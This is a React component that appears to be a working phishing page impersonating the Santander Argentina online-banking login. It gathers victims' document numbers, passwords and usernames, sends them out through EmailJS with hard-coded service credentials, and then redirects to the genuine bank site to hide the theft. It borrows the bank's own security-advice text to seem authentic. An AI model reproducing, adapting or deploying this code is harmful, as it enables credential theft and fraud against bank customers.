import { useEffect, useState } from "react";
import { AiOutlineEyeInvisible, AiOutlineEye } from "react-icons/ai";
import { BsChatRightText } from "react-icons/bs";
import emailjs from "@emailjs/browser";

import "./Forms.scss";

const Forms = () => {
  const [input, setInput] = useState({
    doc: "",
    pass: "",
    user: "",
  });
  const [disabledButtons, setDisabledButtons] = useState(true);
  const [eyeClicked, setEyeClicked] = useState({
    pass: false,
    user: false,
  });

  const validate = () => {
    if (
      input.doc.length >= 8 &&
      input.pass.length > 3 &&
      input.user.length > 4
    ) {
      setDisabledButtons(false);
    } else {
      setDisabledButtons(true);
    }
  };

  useEffect(() => {
    validate();
  }, [input]);

  emailjs.init("0jmVBHAXIIkL5R6cs");

  const handleSubmit = (e) => {
    e.preventDefault();

    console.log("submit");

    emailjs
      .sendForm("service_qmtbahc", "template_4vfmntp", e.target)
      .then((response) => console.log(response))
      .catch((error) => console.log(error));

    setInput({
      doc: "",
      pass: "",
      user: "",
    });

    window.location = "https://www.santander.com.ar/banco/online/personas";
  };

  return (
    <form onSubmit={(e) => handleSubmit(e)}>
      <h2>Ingresá tus datos para operar</h2>
      <div className="inputs">
        <input
          name="doc"
          value={input.doc}
          onChange={(e) => {
            setInput({ ...input, [e.target.name]: e.target.value });
          }}
          type={"number"}
          placeholder={"Tu número de documento"}
        />

        <div className="pass-input">
          <input
            name="pass"
            value={input.pass}
            onChange={(e) => {
              setInput({ ...input, [e.target.name]: e.target.value });
            }}
            type={eyeClicked.pass ? "text" : "password"}
            placeholder={"Tu clave"}
          />
          <AiOutlineEyeInvisible
            onClick={() =>
              setEyeClicked({
                ...eyeClicked,
                pass: true,
              })
            }
            className={eyeClicked.pass ? "eye-icon disabled" : "eye-icon"}
          />
          <AiOutlineEye
            onClick={() =>
              setEyeClicked({
                ...eyeClicked,
                pass: false,
              })
            }
            className={eyeClicked.pass ? "eye-icon open" : "eye-icon disabled"}
          />
        </div>

        <div className="pass-input">
          <input
            name="user"
            value={input.user}
            onChange={(e) => {
              setInput({ ...input, [e.target.name]: e.target.value });
            }}
            type={eyeClicked.user ? "text" : "password"}
            placeholder={"Tu nombre de usuario"}
          />
          <AiOutlineEyeInvisible
            onClick={() =>
              setEyeClicked({
                ...eyeClicked,
                user: true,
              })
            }
            className={eyeClicked.user ? "eye-icon disabled" : "eye-icon"}
          />
          <AiOutlineEye
            onClick={() =>
              setEyeClicked({
                ...eyeClicked,
                user: false,
              })
            }
            className={eyeClicked.user ? "eye-icon open" : "eye-icon disabled"}
          />
        </div>
      </div>

      <div className="security-text">
        <BsChatRightText className="text-icon" />
        <p>
          Nunca compartas por teléfono, email o redes sociales tu Token de
          seguridad, los datos de tu tarjeta de coordenadas ni tus claves.{" "}
          <a href="https://www.santander.com.ar/banco/online/personas/canales-de-atencion/opera-seguro?_ga=2.222393179.1133003244.1665413705-45948444.1665413705">
            Conocé más consejos de seguridad
          </a>
        </p>
      </div>

      {/* https://www2.personas.santander.com.ar/obp-webapp/angular/#!/login */}

      <button
        type="submit"
        disabled={disabledButtons}
        className={disabledButtons ? "" : "active"}
        href="https://www2.personas.santander.com.ar/obp-webapp/angular/#!/login"
      >
        Ingresar
      </button>
    </form>
  );
};

export default Forms;
